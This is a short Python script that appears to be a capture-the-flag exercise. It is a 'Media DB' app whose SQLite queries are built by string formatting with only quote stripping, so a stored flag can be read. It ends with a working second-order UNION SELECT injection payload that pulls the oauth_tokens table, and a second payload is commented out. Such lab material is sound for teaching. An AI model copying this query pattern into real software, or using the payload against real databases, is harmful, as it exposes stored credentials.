#!/usr/bin/env python2.7

import sqlite3
import random
import sys

BANNER = "=== Media DB ==="
MENU = """\
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit"""


flag = 'YOU FOUND IT!!!'


conn = sqlite3.connect(':memory:')
c = conn.cursor()

c.execute("CREATE TABLE oauth_tokens (oauth_token text)")
c.execute("CREATE TABLE media (artist text, song text)")
c.execute("INSERT INTO oauth_tokens VALUES ('{}')".format(flag))

def my_print(s):
  sys.stdout.write(s + '\n')
  sys.stdout.flush()

def print_playlist(query):
  print '>> ' + query
  
  my_print("")
  my_print("== new playlist ==")
  for i, res in enumerate(c.execute(query).fetchall()):
    my_print('{}: "{}" by "{}"'.format(i+1, res[1], res[0]))
  my_print("")



def add_song(artist, song=''):
  artist = artist.replace('"', "")
  song = song.replace('"', "")
  c.execute("""INSERT INTO media VALUES ("{}", "{}")""".format(artist, song))


def play_artist(artist):
  artist = artist.replace("'", "")
  print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))


def play_song(song):
  song = song.replace("'", "")
  print_playlist("SELECT artist, song FROM media WHERE song = '{}'".format(song))


def shuffle_artist():
  artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
  print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))


# add_song(r"'; SELECT * FROM oauth_tokens WHERE '' == '", '')
add_song(r"' UNION SELECT 1,(SELECT * FROM oauth_tokens) --")
shuffle_artist()

